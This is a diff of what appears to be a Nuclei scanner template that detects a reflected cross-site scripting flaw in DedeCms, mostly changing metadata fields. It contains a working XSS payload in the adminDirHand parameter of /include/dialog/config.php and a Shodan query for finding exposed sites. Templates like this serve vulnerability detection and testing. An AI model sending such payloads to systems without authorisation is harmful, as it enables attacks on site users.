@@ -13,17 +13,13 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
-    cwe-id: CWE-80
-    cpe: cpe:2.3:a:dedecms:dedecms:*:*:*:*:*:*:*:*
+    cwe-id: CWE-79
   metadata:
     verified: true
-    max-request: 1
     shodan-query: http.html:"DedeCms"
-    product: dedecms
-    vendor: dedecms
-  tags: dedecms,xss,vuln
+  tags: dedecms,xss
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/include/dialog/config.php?adminDirHand=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
@@ -43,4 +39,5 @@ http:
       - type: status
         status:
           - 200
-# digest: 4b0a0048304602210084d0f4d45048894ee05dfb84e52cf3b04d5f49aff7d31c73599fd27bd324bffe0221008abd2b42a4a820721478595feb6ae2ca19fe834e12cac94407b3fee233869fe1:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/09/15
